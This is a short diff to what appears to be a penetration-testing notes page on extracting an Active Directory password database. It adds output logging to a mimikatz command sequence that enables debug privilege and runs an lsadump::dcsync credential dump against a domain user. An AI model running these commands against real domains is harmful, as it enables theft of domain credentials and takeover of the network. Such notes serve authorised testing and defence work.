@@ -25,5 +25,7 @@ Extracting AD password Database using mimikatz:
 ```
 .\mimikatz.exe
 privilege::debug
+log dcsync.txt
 lsadump::dcsync /domain:<domainname> /user:<domain>\<username>
+log /stop
 ```
